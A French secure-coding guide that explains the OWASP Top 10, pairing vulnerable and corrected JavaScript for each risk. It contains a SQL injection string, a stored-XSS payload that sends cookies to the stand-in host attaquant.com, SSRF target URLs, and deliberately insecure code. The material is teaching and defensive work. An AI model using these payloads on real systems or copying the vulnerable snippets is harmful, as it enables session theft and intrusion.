# OWASP Top 10

L'OWASP (Open Worldwide Application Security Project) publie le classement des 10 risques de sécurité les plus critiques pour les applications web. Cette liste (édition 2021) est la référence mondiale pour les développeurs et auditeurs sécurité.

---

## A01 — Broken Access Control

**Contrôle d'accès défaillant** — un utilisateur accède à des ressources ou actions qui ne lui sont pas autorisées.

```js
// ❌ Vulnérable : l'utilisateur modifie son propre ID dans l'URL
// GET /api/utilisateurs/42/commandes
app.get('/api/utilisateurs/:id/commandes', async (req, res) => {
  const commandes = await db.query(
    'SELECT * FROM commandes WHERE user_id = ?', [req.params.id]
  );
  res.json(commandes);
});

// ✅ Corrigé : vérifier que l'ID correspond à l'utilisateur connecté
app.get('/api/utilisateurs/:id/commandes', authentifie, async (req, res) => {
  if (req.user.id !== parseInt(req.params.id)) {
    return res.status(403).json({ erreur: 'Accès interdit' });
  }
  const commandes = await db.query(
    'SELECT * FROM commandes WHERE user_id = ?', [req.user.id]
  );
  res.json(commandes);
});
```

**Contre-mesures :**
- Appliquer le principe du moindre privilège (refuser par défaut)
- Vérifier les droits côté serveur à chaque requête, jamais uniquement côté client
- Désactiver le listage de répertoires sur le serveur web
- Invalider les tokens JWT à la déconnexion
- Journaliser les échecs de contrôle d'accès

---

## A02 — Cryptographic Failures

**Défaillances cryptographiques** — données sensibles exposées en clair ou mal protégées (mots de passe, données bancaires, données de santé).

```js
// ❌ Vulnérable : mot de passe stocké en MD5 (cassable par rainbow table)
const hash = crypto.createHash('md5').update(motDePasse).digest('hex');

// ❌ Vulnérable : mot de passe stocké en SHA256 sans sel
const hash = crypto.createHash('sha256').update(motDePasse).digest('hex');

// ✅ Corrigé : bcrypt avec facteur de coût adapté
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(motDePasse, 12);  // coût 12 = ~250ms

// Vérification
const valide = await bcrypt.compare(motDePasseSaisi, hashStocke);
```

**Contre-mesures :**
- Ne jamais stocker de mots de passe en clair — utiliser bcrypt, Argon2 ou scrypt
- Chiffrer les données sensibles au repos (AES-256) et en transit (TLS 1.2+)
- Ne pas utiliser MD5 ou SHA1 pour les mots de passe
- Utiliser HTTPS partout, configurer HSTS
- Ne pas stocker de données sensibles inutiles

---

## A03 — Injection

**Injection** — des données non validées sont interprétées comme des commandes (SQL, OS, LDAP, XSS…).

```js
// ❌ Vulnérable : injection SQL
// Saisie malveillante : ' OR '1'='1
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
// → renvoie tous les utilisateurs !

// ✅ Corrigé : requête préparée (paramètres liés)
const [rows] = await db.execute(
  'SELECT * FROM users WHERE email = ? AND password = ?',
  [email, password]
);
```

```js
// ❌ Vulnérable : XSS (Cross-Site Scripting) stocké
// Un commentaire contient : <script>document.location='https://attaquant.com/?c='+document.cookie</script>
element.innerHTML = commentaireUtilisateur;

// ✅ Corrigé : échapper le contenu HTML
element.textContent = commentaireUtilisateur;  // pas d'interprétation HTML

// Ou avec une librairie d'assainissement
const DOMPurify = require('dompurify');
element.innerHTML = DOMPurify.sanitize(commentaireUtilisateur);
```

**Contre-mesures :**
- Toujours utiliser des requêtes préparées ou des ORM pour les requêtes SQL
- Valider et assainir toutes les entrées utilisateur côté serveur
- Échapper les sorties HTML (utiliser `textContent` plutôt qu'`innerHTML`)
- Appliquer une Content Security Policy (CSP)
- Utiliser des linters de sécurité (ESLint security plugin)

---

## A04 — Insecure Design

**Conception non sécurisée** — vulnérabilités issues d'une mauvaise conception en amont, pas corrigeables par simple patch.

```
// ❌ Conception vulnérable : réinitialisation de mot de passe par question secrète
"Quel est le nom de votre animal de compagnie ?"
→ Facilement devinable via les réseaux sociaux

// ✅ Conception correcte : token unique à usage unique et durée limitée
POST /api/reset-password
→ Envoie un token signé (JWT ou UUID) valable 15 minutes
→ Token invalidé après utilisation
→ Tentatives limitées (rate limiting)
```

**Contre-mesures :**
- Intégrer la sécurité dès la phase de conception (Secure by Design)
- Modéliser les menaces (threat modeling) sur les flux sensibles
- Limiter les ressources par utilisateur (rate limiting, quotas)
- Séparer les environnements (prod/staging/dev)
- Définir des cas d'abus en plus des cas d'usage

---

## A05 — Security Misconfiguration

**Mauvaise configuration de sécurité** — paramètres par défaut non modifiés, fonctionnalités inutiles activées, messages d'erreur trop verbeux.

```js
// ❌ Vulnérable : stack trace exposée en production
app.use((err, req, res, next) => {
  res.status(500).json({ erreur: err.stack });  // révèle chemins, versions, logique interne
});

// ✅ Corrigé : message générique en production
app.use((err, req, res, next) => {
  console.error(err);  // log interne uniquement
  res.status(500).json({ erreur: 'Erreur interne du serveur' });
});
```

```js
// ❌ Headers par défaut d'Express révèlent la stack technique
// X-Powered-By: Express

// ✅ Supprimer les headers inutiles avec helmet
const helmet = require('helmet');
app.use(helmet());
app.disable('x-powered-by');
```

**Contre-mesures :**
- Supprimer les fonctionnalités, pages et comptes inutiles
- Changer tous les mots de passe et clés par défaut
- Désactiver les messages d'erreur détaillés en production
- Utiliser `helmet` (Node.js) ou équivalent pour sécuriser les headers HTTP
- Maintenir un processus de revue de configuration régulier

---

## A06 — Vulnerable and Outdated Components

**Composants vulnérables ou obsolètes** — utilisation de bibliothèques, frameworks ou dépendances avec des vulnérabilités connues.

```bash
# ❌ Dépendances jamais auditées ni mises à jour
npm install  # et on oublie

# ✅ Audit régulier des vulnérabilités
npm audit
npm audit fix          # corriger automatiquement
npm audit fix --force  # ⚠️ peut introduire des breaking changes

# Vérifier les dépendances obsolètes
npm outdated

# Outil tiers pour surveillance continue
npx snyk test
```

**Contre-mesures :**
- Exécuter `npm audit` (ou équivalent) à chaque PR et en CI
- Configurer Dependabot ou Renovate pour les mises à jour automatiques
- Supprimer les dépendances non utilisées
- Ne pas utiliser des packages abandonnés ou sans maintenance
- Surveiller les CVE (Common Vulnerabilities and Exposures) des dépendances critiques

---

## A07 — Identification and Authentication Failures

**Défaillances d'authentification** — mots de passe faibles, absence de MFA, sessions mal gérées, tokens prévisibles.

```js
// ❌ Vulnérable : pas de limitation des tentatives de connexion (brute force)
app.post('/login', async (req, res) => {
  const user = await verifierIdentifiants(req.body.email, req.body.password);
  if (user) res.json({ token: genererToken(user) });
  else res.status(401).json({ erreur: 'Identifiants invalides' });
});

// ✅ Corrigé : rate limiting + verrouillage de compte
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                      // 5 tentatives max
  message: 'Trop de tentatives, réessayez dans 15 minutes',
});

app.post('/login', loginLimiter, async (req, res) => {
  // ...
});
```

```js
// ❌ Vulnérable : secret JWT faible ou hardcodé
const token = jwt.sign(payload, 'secret');

// ✅ Corrigé : secret fort depuis les variables d'environnement + expiration courte
const token = jwt.sign(payload, process.env.JWT_SECRET, {
  expiresIn: '15m',     // courte durée pour les access tokens
  algorithm: 'HS256',
});
```

**Contre-mesures :**
- Imposer des mots de passe forts (min. 12 caractères, vérification contre les listes de mots de passe compromis)
- Implémenter le MFA (Multi-Factor Authentication)
- Limiter les tentatives de connexion (rate limiting, CAPTCHA)
- Invalider les sessions à la déconnexion et après inactivité
- Utiliser des tokens d'accès à courte durée de vie + refresh tokens

---

## A08 — Software and Data Integrity Failures

**Défaillances d'intégrité** — code ou données modifiés sans vérification (dépendances non vérifiées, pipelines CI/CD compromis, désérialisation non sécurisée).

```js
// ❌ Vulnérable : désérialisation sans validation du type
app.post('/api/data', (req, res) => {
  const obj = JSON.parse(req.body);  // peut déclencher des gadget chains si objet complexe
  processData(obj);
});

// ❌ Vulnérable : script externe sans vérification d'intégrité (HTML)
<script src="https://cdn.externe.com/lib.js"></script>

// ✅ Corrigé : Subresource Integrity (SRI)
<script
  src="https://cdn.externe.com/lib.js"
  integrity="sha384-xxxx..."
  crossorigin="anonymous">
</script>
```

**Contre-mesures :**
- Vérifier les signatures des packages (npm provenance, checksums)
- Utiliser Subresource Integrity (SRI) pour les ressources CDN
- Valider et typer strictement les données désérialisées
- Sécuriser le pipeline CI/CD (accès, secrets, revue des workflows)
- Ne pas désérialiser des données provenant de sources non fiables

---

## A09 — Security Logging and Monitoring Failures

**Défaillances de journalisation** — activités suspectes non détectées faute de logs, ou logs insuffisamment détaillés pour investiguer un incident.

```js
// ❌ Vulnérable : aucun log des événements de sécurité
app.post('/login', async (req, res) => {
  const user = await verifierIdentifiants(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ erreur: 'Identifiants invalides' });
  res.json({ token: genererToken(user) });
});

// ✅ Corrigé : journalisation des événements critiques
app.post('/login', async (req, res) => {
  const user = await verifierIdentifiants(req.body.email, req.body.password);
  if (!user) {
    logger.warn('Échec de connexion', {
      email: req.body.email,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString(),
    });
    return res.status(401).json({ erreur: 'Identifiants invalides' });
  }
  logger.info('Connexion réussie', { userId: user.id, ip: req.ip });
  res.json({ token: genererToken(user) });
});
```

**Contre-mesures :**
- Journaliser : connexions (succès/échec), accès aux données sensibles, erreurs, changements de configuration
- Ne jamais logger de données sensibles (mots de passe, tokens, numéros de carte)
- Centraliser les logs (ELK, Datadog, CloudWatch) et configurer des alertes
- Conserver les logs suffisamment longtemps (min. 90 jours recommandé)
- Tester régulièrement que les alertes fonctionnent

---

## A10 — Server-Side Request Forgery (SSRF)

**Falsification de requête côté serveur** — le serveur est manipulé pour envoyer des requêtes vers des ressources internes non accessibles depuis l'extérieur.

```js
// ❌ Vulnérable : le serveur fetche une URL fournie par l'utilisateur
// Attaque : url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
// Attaque : url=http://localhost:6379/ (Redis interne)
app.get('/proxy', async (req, res) => {
  const { url } = req.query;
  const response = await fetch(url);  // fetch interne non contrôlé !
  res.send(await response.text());
});

// ✅ Corrigé : liste blanche des domaines autorisés
const DOMAINES_AUTORISES = ['api.exemple.com', 'cdn.exemple.com'];

app.get('/proxy', async (req, res) => {
  const { url } = req.query;
  const parsed = new URL(url);

  if (!DOMAINES_AUTORISES.includes(parsed.hostname)) {
    return res.status(400).json({ erreur: 'URL non autorisée' });
  }

  const response = await fetch(url);
  res.send(await response.text());
});
```

**Contre-mesures :**
- Valider et filtrer toutes les URLs fournies par l'utilisateur
- Utiliser une liste blanche de domaines/IPs autorisés (pas une liste noire)
- Désactiver les redirections HTTP dans les requêtes serveur
- Bloquer les plages IP internes (10.x.x.x, 172.16.x.x, 192.168.x.x, 127.x.x.x, 169.254.x.x)
- Segmenter le réseau pour limiter l'accès aux services internes

---

## Checklist rapide

| # | Vulnérabilité | Vérification rapide |
|---|---|---|
| A01 | Broken Access Control | Les droits sont vérifiés côté serveur à chaque requête ? |
| A02 | Cryptographic Failures | Mots de passe hashés avec bcrypt/Argon2 ? HTTPS activé ? |
| A03 | Injection | Requêtes préparées ? Entrées assainies ? CSP configurée ? |
| A04 | Insecure Design | Threat modeling effectué ? Rate limiting sur les flux sensibles ? |
| A05 | Security Misconfiguration | Headers de sécurité activés ? Stack trace masquée en prod ? |
| A06 | Outdated Components | `npm audit` en CI ? Dependabot configuré ? |
| A07 | Auth Failures | Rate limiting sur le login ? Tokens avec expiration courte ? |
| A08 | Integrity Failures | SRI sur les CDN ? Pipeline CI/CD sécurisé ? |
| A09 | Logging Failures | Événements de sécurité journalisés ? Alertes configurées ? |
| A10 | SSRF | URLs utilisateur validées contre une liste blanche ? |
